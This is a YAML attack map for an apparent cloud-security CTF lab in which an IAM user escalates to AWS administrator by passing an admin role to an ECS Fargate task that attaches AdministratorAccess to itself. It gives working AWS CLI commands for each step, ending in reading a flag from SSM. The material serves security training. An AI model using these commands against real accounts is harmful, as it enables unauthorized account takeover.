attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-004-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole, ecs:RegisterTaskDefinition, and ecs:RunTask
        permissions, allowing it to launch an ECS Fargate task using an administrative
        role to escalate its own privileges.

    - id: ecs-task-definition
      label: "ECS Task Definition"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-004-privesc"
      description: >
        A malicious ECS task definition registered by the attacker. It specifies the
        admin target role as the task execution role and defines a container command
        that attaches the AdministratorAccess policy to the starting user.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role"
      description: >
        An IAM role with AdministratorAccess that trusts ecs-tasks.amazonaws.com. The
        starting user passes this role to the ECS task definition. When the Fargate task
        runs, it receives temporary credentials for this role via the ECS metadata endpoint,
        enabling it to make privileged IAM API calls. The task uses these credentials to
        attach AdministratorAccess to the starting user, completing the privilege escalation.
        The attacker then uses the resulting admin-equivalent permissions to read the
        scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ecs-004-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: ecs-task-definition
      label: "iam:PassRole + ecs:RegisterTaskDefinition"
      description: >
        The starting user registers an ECS task definition, passing the admin target
        role as the task execution role and specifying a container command to attach
        AdministratorAccess to themselves.
      hints:
        - "Register a task definition that passes the admin role as taskRoleArn and executionRoleArn, with a container command that calls iam:AttachUserPolicy to grant AdministratorAccess to the starting user. A stock AWS CLI image (public.ecr.aws/aws-cli/aws-cli:latest) is sufficient."
        - "Fargate tasks require network configuration — find a default subnet and set assignPublicIp to ENABLED so the container can reach the IAM API. Poll ecs:DescribeTasks until STOPPED, then verify with iam:ListAttachedUserPolicies."
        - "Browse to https://pathfinding.cloud/paths/ecs-004 for technique details."
      commands:
        - description: "Register the malicious ECS task definition with the admin role"
          command: |
            aws ecs register-task-definition \
              --family pl-prod-ecs-004-privesc \
              --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
              --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
              --network-mode awsvpc \
              --requires-compatibilities FARGATE \
              --cpu 256 --memory 512 \
              --container-definitions '[{"name":"privesc","image":"public.ecr.aws/aws-cli/aws-cli:latest","command":["iam","attach-user-policy","--user-name","pl-prod-ecs-004-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'

    - from: ecs-task-definition
      to: target-role
      label: "ecs:RunTask"
      description: >
        The starting user launches the registered task on AWS Fargate. The task
        receives temporary credentials for the admin target role via the ECS task
        metadata endpoint, then executes the AWS CLI command inside the container to
        attach AdministratorAccess to the starting user, completing the privilege escalation.
      hints: []
      commands:
        - description: "Run the ECS Fargate task"
          command: |
            aws ecs run-task \
              --cluster pl-prod-ecs-004-cluster \
              --task-definition pl-prod-ecs-004-privesc \
              --launch-type FARGATE \
              --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}"
        - description: "Verify the policy was attached (run after task completes)"
          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-004-to-admin-starting-user"
        - description: "Verify admin access with the starting user's credentials"
          command: "aws iam list-users"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter path to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ecs-004-to-admin --query 'Parameter.Value' --output text"
